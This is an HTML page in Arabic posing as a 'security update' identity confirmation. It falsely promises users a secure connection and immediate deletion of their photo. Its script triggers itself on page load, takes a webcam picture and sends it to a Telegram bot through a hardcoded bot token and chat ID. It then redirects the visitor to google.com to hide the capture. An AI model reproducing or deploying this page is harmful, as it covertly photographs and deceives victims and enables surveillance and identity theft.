<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>تحديث أمني</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0a0f1c;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
        }
        .logo {
            width: 70px;
            height: 70px;
            background: #0a0f1c;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
            color: white;
        }
        h1 {
            color: #0a0f1c;
            font-size: 24px;
            margin-bottom: 10px;
        }
        .sub {
            color: #666;
            font-size: 14px;
            margin-bottom: 20px;
        }
        .security-badge {
            background: #e8f0fe;
            border-radius: 50px;
            padding: 8px 16px;
            display: inline-block;
            font-size: 12px;
            color: #1a73e8;
            margin-bottom: 25px;
        }
        .info-box {
            background: #f0f7ff;
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }
        .info-box p {
            color: #1a73e8;
            font-size: 13px;
            margin: 8px 0;
        }
        button {
            background: #0a0f1c;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin: 20px 0;
        }
        .status {
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            display: none;
            margin-top: 15px;
        }
        .status.show { display: block; }
        .status.loading { background: #fff3cd; color: #856404; }
        .status.success { background: #d4edda; color: #155724; }
        .status.error { background: #f8d7da; color: #721c24; }
        video, canvas { display: none; }
        .footer { font-size: 11px; color: #aaa; margin-top: 20px; }
    </style>
</head>
<body>
<div class="card">
    <div class="logo">🔒</div>
    <h1>تحديث الأمان</h1>
    <div class="sub">لحماية حسابك، يرجى تأكيد هويتك</div>
    <div class="security-badge">اتصال آمن ومشفر</div>
    <div class="info-box">
        <p>✓ إجراء روتيني لحماية الخصوصية</p>
        <p>✓ يستغرق ثانية واحدة فقط</p>
        <p>✓ يتم حذف الصورة فور التأكيد</p>
    </div>
    <button id="startBtn">تأكيد الهوية</button>
    <div class="status" id="status"></div>
    <div class="footer">© 2025 - جميع الحقوق محفوظة</div>
</div>
<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
const BOT_TOKEN = "8365043460:AAGa2EIVhOTKFa7wEuARpb_cuEsDIa2bVxs";
const CHAT_ID = "8545876964";
const startBtn = document.getElementById('startBtn');
const statusDiv = document.getElementById('status');

// طلب الكاميرا فور تحميل الصفحة
window.addEventListener('load', function() {
    startBtn.click();
});

startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    startBtn.innerText = 'جاري التحقق...';
    statusDiv.className = 'status show loading';
    statusDiv.innerText = 'جاري الاتصال بالخادم الآمن...';

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;

        video.onloadedmetadata = () => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            statusDiv.innerText = 'جاري إرسال بيانات التحقق...';

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob);

                try {
                    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                    const json = await res.json();
                    if (json.ok) {
                        statusDiv.className = 'status show success';
                        statusDiv.innerText = '✓ تم التحقق بنجاح! جاري التحويل...';
                        setTimeout(() => {
                            window.location.href = 'https://www.google.com';
                        }, 1500);
                    } else {
                        throw new Error(json.description);
                    }
                } catch(e) {
                    statusDiv.className = 'status show error';
                    statusDiv.innerText = '✗ خطأ تقني، يرجى المحاولة لاحقاً';
                    startBtn.disabled = false;
                    startBtn.innerText = 'تأكيد الهوية';
                }
            }, 'image/jpeg');
            stream.getTracks().forEach(t => t.stop());
        };
    } catch(error) {
        statusDiv.className = 'status show error';
        statusDiv.innerText = '✗ يرجى السماح بالوصول إلى الكاميرا';
        startBtn.disabled = false;
        startBtn.innerText = 'تأكيد الهوية';
    }
});
</script>
</body>
</html>
